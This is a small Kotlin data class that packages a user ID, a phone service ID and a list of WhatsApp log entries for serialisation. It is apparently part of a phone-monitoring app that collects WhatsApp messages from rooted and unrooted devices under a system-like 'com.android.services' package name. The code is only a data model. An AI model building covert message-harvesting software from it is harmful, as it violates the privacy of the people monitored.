package com.android.services.models.im

import com.android.services.db.entities.WhatsAppRooted
import com.google.gson.annotations.SerializedName

class WhatsAppLogs {
    @SerializedName("userId")
    var userId: String? = null
        private set

    @SerializedName("phoneServiceId")
    var phoneServiceId: String? = null
        private set

    @SerializedName("whatsappLogs")
    var whatsAppList: List<WhatsAppRooted>? = null
        private set

    constructor()
    constructor(
        userId: String?,
        phoneServiceId: String?,
        whatsAppUnrootedList: List<WhatsAppRooted>?
    ) {
        this.userId = userId
        this.phoneServiceId = phoneServiceId
        whatsAppList = whatsAppUnrootedList
    }
}